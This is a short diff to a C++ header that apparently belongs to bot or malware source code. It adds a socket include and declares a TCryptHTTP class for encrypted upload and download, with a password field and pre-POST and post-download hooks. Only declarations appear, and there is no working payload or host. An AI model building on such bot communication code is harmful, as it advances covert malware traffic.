@@ -15,6 +15,7 @@
 #include <windows.h>
 #include "Strings.h"
 #include "BotHTTP.h"
+#include "BotSocket.h"
 
 
 //****************************************************************************
@@ -32,5 +33,21 @@ namespace CryptHTTP
 	bool Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer = false);
 }
 
+
+
+//*******************************************************
+// TCryptHTTP - класс шифрованной загрузки данных
+//*******************************************************
+class TCryptHTTP : public THTTP
+{
+protected:
+	void DoBeforePostData(TBotStream* PostData);
+	void DoDownloadCompleted(TBotStream* ResponseData);
+public:
+	string Password;
+
+	TCryptHTTP() : THTTP() {};
+	TCryptHTTP(TBotSocket* Socket) : THTTP(Socket) {};
+};
 //---------------------------------------------------------------------------
 #endif
